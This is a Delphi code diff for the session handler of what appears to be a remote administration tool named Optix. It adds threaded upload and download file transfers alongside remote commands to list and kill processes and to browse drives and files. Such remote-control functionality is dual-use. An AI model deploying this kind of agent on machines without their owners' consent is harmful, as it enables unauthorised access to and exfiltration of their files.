@@ -45,29 +45,108 @@ unit Optix.Protocol.SessionHandler;
 
 interface
 
-uses System.Classes, Optix.Protocol.Client.Handler, Optix.Protocol.Packet,
-     XSuperObject, Optix.Protocol.Preflight;
+uses System.Classes, Optix.Protocol.Client.Handler, Optix.Protocol.Packet, XSuperObject, Optix.Protocol.Preflight,
+     Optix.Protocol.Worker.FileTransfer, Optix.Func.Commands;
 
 type
   TOptixSessionHandlerThread = class(TOptixClientHandlerThread)
   private
+    FFileTransferOrchestrator : TOptixFileTransferOrchestratorThread;
 
+    {@M}
+    procedure InitializeFileTransferOrchestratorThread();
   protected
     {@M}
-    procedure EstablishedConnection(); override;
+    function InitializePreflightRequest() : TOptixPreflightRequest; override;
+    procedure Initialize(); override;
+    procedure Finalize(); override;
+
+    procedure RegisterNewFileTransfer(const ATransfer : TOptixTransfer);
+
+    procedure Connected(); override;
+    procedure Disconnected(); override;
     procedure PacketReceived(const ASerializedPacket : ISuperObject); override;
   end;
 
 implementation
 
-uses Winapi.Windows, Optix.Func.SessionInformation, System.SysUtils,
-     Optix.Func.Commands, Optix.Func.Enum.Process, Optix.Actions.Process,
-     Optix.Func.LogNotifier, Optix.Func.Enum.FileSystem;
+uses Winapi.Windows, Optix.Func.SessionInformation, System.SysUtils, Optix.Func.Enum.Process, Optix.Actions.Process,
+     Optix.Func.LogNotifier, Optix.Func.Enum.FileSystem, Optix.Thread;
 
-{ TOptixSessionHandlerThread.EstablishedConnection }
-procedure TOptixSessionHandlerThread.EstablishedConnection();
+
+{ TOptixSessionHandlerThread.Initialize }
+procedure TOptixSessionHandlerThread.Initialize();
 begin
+  inherited;
+  ///
+
+  FFileTransferOrchestrator := nil;
+end;
+
+{ TOptixSessionHandlerThread.Finalize }
+procedure TOptixSessionHandlerThread.Finalize();
+begin
+  inherited;
+  ///
+
+end;
+
+{ TOptixSessionHandlerThread.InitializePreflightRequest }
+function TOptixSessionHandlerThread.InitializePreflightRequest() : TOptixPreflightRequest;
+begin
+  result.ClientKind := ckHandler;
+end;
+
+{ TOptixSessionHandlerThread.InitializeFileTransferOrchestratorThread }
+procedure TOptixSessionHandlerThread.InitializeFileTransferOrchestratorThread();
+begin
+  var ADoCreate := True;
+  ///
+
+  if Assigned(FFileTransferOrchestrator) then
+    ADoCreate := not TOptixThread.HasInstance(FFileTransferOrchestrator);
+
+  if ADoCreate then begin
+    FFileTransferOrchestrator := TOptixFileTransferOrchestratorThread.Create(
+      FClient.RemoteAddress,
+      FClient.RemotePort
+    );
+
+    ///
+    FFileTransferOrchestrator.Start();
+  end;
+end;
+
+{ TOptixSessionHandlerThread.RegisterNewFileTransfer }
+procedure TOptixSessionHandlerThread.RegisterNewFileTransfer(const ATransfer : TOptixTransfer);
+begin
+  InitializeFileTransferOrchestratorThread();
+  ///
+
+  FFileTransferOrchestrator.AddTransfer(ATransfer);
+end;
+
+{ TOptixSessionHandlerThread.Connected }
+procedure TOptixSessionHandlerThread.Connected();
+begin
+  inherited;
+  ///
+
   self.AddPacket(TOptixSessionInformation.Create());
+end;
+
+{ TOptixSessionHandlerThread.Disconnected }
+procedure TOptixSessionHandlerThread.Disconnected();
+begin
+  inherited;
+  ///
+
+  if Assigned(FFileTransferOrchestrator) then begin
+    TOptixThread.TerminateInstance(FFileTransferOrchestrator);
+
+    ///
+    FFileTransferOrchestrator := nil;
+  end;
 end;
 
 { TOptixSessionHandlerThread.PacketReceived }
@@ -89,13 +168,13 @@ begin
   var AHandleMemory : Boolean := False;
   try
     try
-      // -----------------------------------------------------------------------
+      // ---------------------------------------------------------------------------------------------------------------
       if AClassName = TOptixCommandTerminate.ClassName then
         Terminate
-      // -----------------------------------------------------------------------
+      // ---------------------------------------------------------------------------------------------------------------
       else if AClassName = TOptixRefreshProcess.ClassName then
         AddPacket(TProcessList.Create(AWindowGUID))
-      // -----------------------------------------------------------------------
+      // ---------------------------------------------------------------------------------------------------------------
       else if AClassName = TOptixKillProcess.ClassName then begin
         AHandleMemory := True;
         ///
@@ -106,17 +185,22 @@ begin
 
         AddPacket(AOptixPacket); // Success notification
       end
-      // -----------------------------------------------------------------------
+      // ---------------------------------------------------------------------------------------------------------------
       else if AClassName = TOptixRefreshDrives.ClassName then
         AddPacket(TDriveList.Create(AWindowGUID))
-      // -----------------------------------------------------------------------
+      // ---------------------------------------------------------------------------------------------------------------
       else if AClassName = TOptixRefreshFiles.ClassName then begin
         AOptixPacket := TOptixRefreshFiles.Create(ASerializedPacket);
 
         AddPacket(TFileList.Create(AWindowGUID, TOptixRefreshFiles(AOptixPacket).Path));
-      end;
-      // -----------------------------------------------------------------------
-
+      end
+      // ---------------------------------------------------------------------------------------------------------------
+      else if AClassName = TOptixDownloadFile.ClassName then
+        RegisterNewFileTransfer(TOptixDownloadFile.Create(ASerializedPacket))
+      // ---------------------------------------------------------------------------------------------------------------
+      else if AClassName = TOptixUploadFile.ClassName then
+        RegisterNewFileTransfer(TOptixUploadFile.Create(ASerializedPacket))
+      // ---------------------------------------------------------------------------------------------------------------
       // ... //
     except
       on E : Exception do
